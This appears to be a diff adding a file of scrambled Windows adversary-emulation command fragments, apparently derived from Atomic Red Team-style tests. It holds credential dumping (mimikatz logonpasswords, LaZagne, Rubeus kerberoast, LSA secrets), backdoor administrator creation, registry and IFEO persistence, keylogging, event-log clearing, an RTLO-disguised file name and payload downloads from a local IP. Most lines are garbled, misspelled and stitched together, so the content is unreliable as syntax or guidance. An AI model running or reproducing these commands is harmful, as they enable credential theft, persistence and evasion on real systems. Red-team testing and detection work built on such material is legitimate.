@@ -1,0 +1,64 @@
+net user = `` administrators '' binpath= `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' '' `` `` $ { target volumn name % windir volumn name % \system32\osk.exe ;
+`` [ ueraccount get /output $ ( ) ; invoke-rubeus querylanguage= create shadow hklm\security\policy\secrets % temp % \system32\windowspowershell\v1.0\powershell.exe % components\atomic_test execution options\osk.exe '' -name `` threadingmodel '' -value `` threadingmodel '' -value administrators : ''
+net user `` `` hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist '' `` $ { domain }
+net user administrator /add
+dir $ : directory_path
+namp -sn $ { ip }
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v `` hkey_local_machine\system\currentcontrolset\control\session packages '' /d `` $ { command '' /f
+sekurlsa : `` -path `` $ : :logonpasswords
+lazagne.exe windows -lsa
+namp -sn $ { ip
+psexec \\ { id you hklm\software\microsoft\powershell\1\shellids\microsoft.powershell ' = ( new-object -comobject /v ( \updater.exe
+wscript $ { flie_name } abc‮xcod.scr
+net uesr
+[ myprocess ] : \windows\system32\comsvcs.dll , % ' set * from win32_pnpentity where ( net.securityprotocoltype ] ] : \user $ a = `` clearing = `` : \software\microsoft\command os ; querylanguage= '' ; querylanguage= software\classes\clsid : spooler bookmarks
+copy $ wscriptshell.createshortcut ( `` $ hklm\software\microsoft\windows username ; wevtutil cl `` '' '' `` .\ { output_zip_name } > $ { filename_regex
+cmdkey /list
+rubeus.exe kerberoast reg_dword user
+net user = `` c : username /domain
+get-ciminstance -classname win32_processor -accepteula /category : :securityprotocol = `` http : //192.168.1.29:9000/payload/evil.exe -f [ ] : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+$ shortcut.targetpath= '' '' ;
+rdrleakdiag.exe /p '' volumn name you create = set-wmiinstance , keylog
+net user = $ shortcutlocation ;
+net user user /add
+net user /add = `` domain
+ipconfig
+net stop
+rundll32 /domain
+namp -sn $ { filename_regex } password=
+net localgroup administrators
+quser
+net user @ `` hkey_local_machine\system\currentcontrolset\services\ntds '' @ `` '' ; in : @ $ { user_name } in ( $ i ; in ( $ i ; full
+namp -sn -l @ $ { filename_regex }
+attrib +h `` driver ''
+net group `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` reg_dword /d 1 /f
+psexec.exe \\ $ ( service \system32\osk.exe
+rundll32 unload $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+copy `` : @ : [ -list | % localappdata % \microsoft\teams\current\teams.exe
+gobuster /set reg `` -filepath $ shortcut = `` defaultaccount ;
+net localgroup administrators administrators binpath=
+nmap -- /for=c
+shell $ shortcut = `` hkey_local_machine\software\microsoft\windows file execution options\spoolsv.exe '' `` $ true
+rdrleakdiag.exe /p target = `` '' domain
+lazagne.exe windows
+rundll32 popcalc.dll , keylog
+bitsadmin.exe /create $ wscriptshell.createshortcut ( `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 \inprocserver32 '' -name `` autorun '' -value `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+remove-item -path `` $ { filename_regex }
+quser
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution -comobject set -class -user $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+import-module .\screencap.ps1
+gpresult /z
+adfind.exe -f minidump : new-object net.webclient \\ { net.servicepointmanager ] : net.webclient ) \\ $ ( ) \\ $ ( shell.createshortcut ( `` = set-wmiinstance file execution manager\appcertdlls ; full full
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rundll32 popcalc.dll , keylog
+cmdkey /list
+cscript $ { shadow python make_image.py $ { -path = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /user : @ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 = @ `` cor_profiler = administrators } ;
+namp -sn '' /domain
+nmap -o $ { volumn file wscriptshell.createshortcut ( `` ; /grant administrators : = `` keylog
+reg add `` hklm\software\microsoft\windows \\ `` `` hkey_local_machine\system\currentcontrolset\control\session impersonate_user % manager\appcertdlls filter = `` filter = `` $ filter ; full full
+namp -sn $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` @ `` $ { user_name } in `` $ { filename_regex } \inprocserver32
+`` -filepath `` $ ( `` hklm\software\microsoft\windows t1547.009 file `` hklm\software\microsoft\windows `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_sz /d bypass
+net user administrator
+net user defaultaccount = `` domain
+rubeus.exe kerberoast windir volumn binpath= `` cor_enable_profiling
+net user administrator /add
